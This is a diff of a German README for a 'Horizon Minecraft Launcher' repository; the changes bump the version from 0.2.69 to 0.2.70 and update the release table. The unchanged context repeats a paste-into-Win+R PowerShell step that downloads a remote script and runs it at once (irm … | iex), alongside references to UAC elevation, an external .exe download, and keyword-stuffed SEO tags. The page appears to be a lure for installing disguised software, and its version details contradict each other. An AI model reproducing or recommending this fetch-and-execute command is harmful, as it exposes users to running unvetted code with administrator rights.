@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>Letztes Update:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69">0.2.69</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70">0.2.70</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">Alle Updates und Patches</a>
 </p>
 
@@ -64,12 +64,12 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/Preis-Kostenlos-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.69-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.69-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.70-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.70-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.70-blue"></a>
 </p>
 
-<p align="center"><em>Stand 2026-11-16: Launcher <strong>0.2.69</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/de/">horizonlauncher.net</a>.</em></p>
+<p align="center"><em>Stand 2026-11-17: Launcher <strong>0.2.70</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/de/">horizonlauncher.net</a>.</em></p>
 
 [![Horizon Minecraft auf Rust herunterladen](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/de/)
 
@@ -145,10 +145,11 @@ Horizon gehört **nicht** Mojang / Microsoft. Nur von **horizonlauncher.net** la
 
 Horizon wird gepflegt: Patches kommen regelmäßig. Jede Version ist ein eigenes Release mit Changelog. Aktuelles Setup auf der Website, Patch-Historie hier.
 
-**Letztes Update:** [0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) · **[Alle Updates und Patches](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 Releases (0.2.0 → 0.2.69).
+**Letztes Update:** [0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) · **[Alle Updates und Patches](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 Releases (0.2.0 → 0.2.70).
 
 | Version | Datum | |
 |---|---|---|
+| **[0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70)** | 2026-11-17 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) |
 | **[0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69)** | 2026-11-16 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) |
 | **[0.2.68](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68)** | 2026-11-15 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68) |
 | **[0.2.67](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67)** | 2026-11-15 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67) |
@@ -164,10 +165,9 @@ Horizon wird gepflegt: Patches kommen regelmäßig. Jede Version ist ein eigenes
 | **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
 | **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
 | **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
-| **[0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54)** | 2026-11-08 | [Notizen](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) |
 
 
-Ältere Versionen: [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) · [0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)
+Ältere Versionen: [0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) · [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44)
 
 
 ## Was ist Horizon Minecraft
@@ -190,7 +190,7 @@ Horizon Minecraft lädst du offiziell nur über die Website, nicht über Spiegel
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.69**
+- Horizon **0.2.70**
 - Kostenlos · Website auf Russisch und Englisch
 
 ## Horizon installieren — zwei Methoden
@@ -223,7 +223,7 @@ Vollständige Anleitung: [https://horizonlauncher.net/de/install-horizon/](https
 Derselbe Horizon-Installer — normaler Dateidownload, kein Befehl. Aktuell: **0.2.54**, Windows x64, ~60 MB.
 
 **[Horizon herunterladen — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.69
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.70
 
 1. [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe) herunterladen.
 2. Windows-Installer starten.
@@ -287,7 +287,7 @@ Inoffizieller Client. Nur **horizonlauncher.net**.
 
 ### Top-Suchen
 
-`Horizon herunterladen` · `Horizon Launcher Windows` · `Minecraft Rust Edition` · `Horizon 0.2.69` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+`Horizon herunterladen` · `Horizon Launcher Windows` · `Minecraft Rust Edition` · `Horizon 0.2.70` · [Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## FAQ
 
@@ -304,13 +304,13 @@ Nein. Ein Minecraft-Java-Client in der Sprache Rust.
 Nicht für den Rust-Client von Horizon.
 
 **Welche Lizenz?**  
-Ab **0.2.69** ist Horizon upstream **LGPL-3.0-or-later**. [https://horizonlauncher.net/de/legal/](https://horizonlauncher.net/de/legal/).
+Ab **0.2.70** ist Horizon upstream **LGPL-3.0-or-later**. [https://horizonlauncher.net/de/legal/](https://horizonlauncher.net/de/legal/).
 
 **Distant Horizons, Create, Shader?**  
 Ja — native Mods (.hnmod). [https://horizonlauncher.net/de/distant-horizons/](https://horizonlauncher.net/de/distant-horizons/) · [Create](https://horizonlauncher.net/de/create-mod/) · [Shader](https://horizonlauncher.net/de/shaders/).
 
-**Changelog 0.2.65–0.2.69?**  
-[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · Launcher **0.2.69** auf [https://horizonlauncher.net/de/](https://horizonlauncher.net/de/).
+**Changelog 0.2.65–0.2.70?**  
+[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · Launcher **0.2.70** auf [https://horizonlauncher.net/de/](https://horizonlauncher.net/de/).
 
 **Windows 7 / macOS / Linux?**  
 Nur **Windows 10/11 x64**. Details: [https://horizonlauncher.net/de/download-horizon/](https://horizonlauncher.net/de/download-horizon/).
@@ -334,12 +334,12 @@ Damit Suchanfragen wie «Horizon launcher github» zu **[horizonlauncher.net](ht
 
 ## Englisch — Horizon Minecraft Launcher herunterladen
 
-**Horizon** ist ein kostenloser **Minecraft-Launcher für Windows** und ein **Java-Client in Rust** (Minecraft Rust Edition). Offizielle englische Seite: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**. Nicht von Mojang/Microsoft.
+**Horizon** ist ein kostenloser **Minecraft-Launcher für Windows** und ein **Java-Client in Rust** (Minecraft Rust Edition). Offizielle englische Seite: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.70**. Nicht von Mojang/Microsoft.
 
 
 ## SEO-Tags und Suchbegriffe
 
-`Horizon herunterladen` `Horizon Launcher` `Minecraft auf Rust` `Horizon 0.2.69` `horizonlauncher.net` `download Horizon`
+`Horizon herunterladen` `Horizon Launcher` `Minecraft auf Rust` `Horizon 0.2.70` `horizonlauncher.net` `download Horizon`
 
 `Horizon download` `Horizon Minecraft herunterladen` `Minecraft Launcher Windows` `Minecraft in Rust` `Minecraft Rust Edition` `mehr FPS Minecraft` `horizonlauncher.net` `Win+R Horizon` `schnelle Horizon Installation` `Horizon setup` `Horizon herunterladen` `Distant Horizons Horizon`
 
